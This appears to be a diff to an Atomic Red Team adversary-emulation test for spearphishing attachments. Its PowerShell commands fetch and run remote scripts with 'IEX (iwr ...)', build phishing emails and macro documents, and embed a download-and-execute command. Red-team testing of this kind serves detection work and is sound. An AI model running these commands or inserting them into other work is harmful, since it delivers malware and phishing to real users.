@@ -94,7 +94,6 @@ atomic_tests:
             $msword = New-Object -ComObject word.application
             Stop-Process -Name WINWORD
     executor:
-        elevation_required: true
         command: |
             IEX (iwr "https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1566.001/bin/docPhish.ps1")
             $MsgLocation = Join-Path -Path "#{email_savepath}" -ChildPath "#{email_filename}.msg"
@@ -196,6 +195,14 @@ atomic_tests:
             description: Name of the document to attach to the email
             type: String
             default: Invoice 12857498A
+        doc_image_location:
+            description: Name of the image to insert into the document
+            type: String
+            default: Default
+        execute_file:
+            description: True or False if you want to execute the msg or document
+            type: String
+            default: true
     dependency_executor_name: powershell
     dependencies:
     -   description: |
@@ -206,12 +213,12 @@ atomic_tests:
             $msword = New-Object -ComObject word.application
             Stop-Process -Name WINWORD
     executor:
-        elevation_required: true
         command: |
             IEX (iwr "https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1566.001/bin/docPhish.ps1")
             $MsgLocation = Join-Path -Path "#{email_savepath}" -ChildPath "#{email_filename}.msg"
             $DocLocation = Join-Path -Path "#{doc_savepath}" -ChildPath "#{doc_name}.doc"
-            Invoke-DocPhish -Generate Msg -DocName "#{doc_name}" -DocPath "#{doc_savepath}" -MsgName "#{email_filename}" -MsgPath "#{email_savepath}" -MsgTo "#{email_recipient}" -MsgSubject "#{email_subject}" -MsgBody "#{email_body}" -ExeName "#{executable_name}" -ExePath "#{executable_location}" -ExeUrl "#{download_url}" -Execute "True"
+            if ("#{doc_image_location}" -like "C:\*"){ $PathToImage = "#{doc_image_location}"}else{$PathToImage = Join-Path -Path $PathToAtomicsFolder -ChildPath #{doc_image_location}}
+            Invoke-DocPhish -Generate Msg -DocName "#{doc_name}" -DocPath "#{doc_savepath}" -MsgName "#{email_filename}" -MsgPath "#{email_savepath}" -MsgTo "#{email_recipient}" -MsgSubject "#{email_subject}" -MsgBody "#{email_body}" -ExeName "#{executable_name}" -ExePath "#{executable_location}" -ExeUrl "#{download_url}" -Execute "#{execute_file}" -DocImage "$PathToImage"
         cleanup_command: |
             Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\Word\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
             $ExecutablePath = Join-Path -Path "#{executable_location}" -ChildPath "#{executable_name}.exe"
@@ -262,8 +269,8 @@ atomic_tests:
             $msword = New-Object -ComObject word.application
             Stop-Process -Name WINWORD
     executor:
-        elevation_required: true
         command: |
+            Write-Host "Test Started"
             IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
             $ExecutablePath = Join-Path -Path #{executable_location} -ChildPath #{executable_name}
             $Command = "`$client = new-object System.Net.WebClient; `$client.DownloadFile(`"#{download_url}`",`"$ExecutablePath`"); Start-Process -Filepath `"$ExecutablePath`""
